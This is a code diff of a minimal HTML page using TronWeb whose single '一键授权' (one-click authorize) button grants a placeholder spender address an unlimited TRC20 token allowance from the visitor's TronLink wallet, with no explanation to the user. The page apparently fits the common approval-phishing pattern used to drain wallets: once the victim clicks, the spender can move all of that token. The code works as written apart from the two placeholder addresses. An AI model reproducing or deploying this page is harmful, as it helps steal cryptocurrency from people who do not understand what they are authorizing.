@@ -3,25 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 无限授权与批量授权</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; }
-        #status { margin-top: 10px; color: green; }
-    </style>
+    <title>TRC20 无限授权</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
 </head>
 <body>
+    <h1>TRC20代币授权</h1>
+    <button id="authorizeBtn">一键授权</button>
 
-    <h1>TRC20 无限授权与批量授权</h1>
-    
-    <div>
-        <label for="tokens">输入代币合约地址（用逗号分隔）:</label><br>
-        <input type="text" id="tokens" placeholder="如：TOKEN_ADDRESS_1, TOKEN_ADDRESS_2" style="width: 100%;">
-    </div>
-    
-    <button id="approveBtn">一键无限授权</button>
-    <p id="status"></p>
+    <script>
+        const trc20ContractAddress = '代币合约地址'; // 替换为你想授权的代币合约地址
+        const spenderAddress = '目标地址'; // 替换为你要授权给的地址（接收者）
+        const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 最大授权值（无限）
 
-    <script src="script.js"></script>
+        async function authorize() {
+            if (typeof window.tronWeb === 'undefined') {
+                alert("请先安装并链接TronLink钱包！");
+                return;
+            }
+
+            try {
+                const contract = await tronWeb.contract().at(trc20ContractAddress);
+                const result = await contract.approve(spenderAddress, maxUint256).send();
+                alert('授权成功！交易ID: ' + result);
+            } catch (error) {
+                console.error('授权失败', error);
+                alert('授权失败，请重试');
+            }
+        }
+
+        document.getElementById('authorizeBtn').addEventListener('click', authorize);
+    </script>
 </body>
 </html>
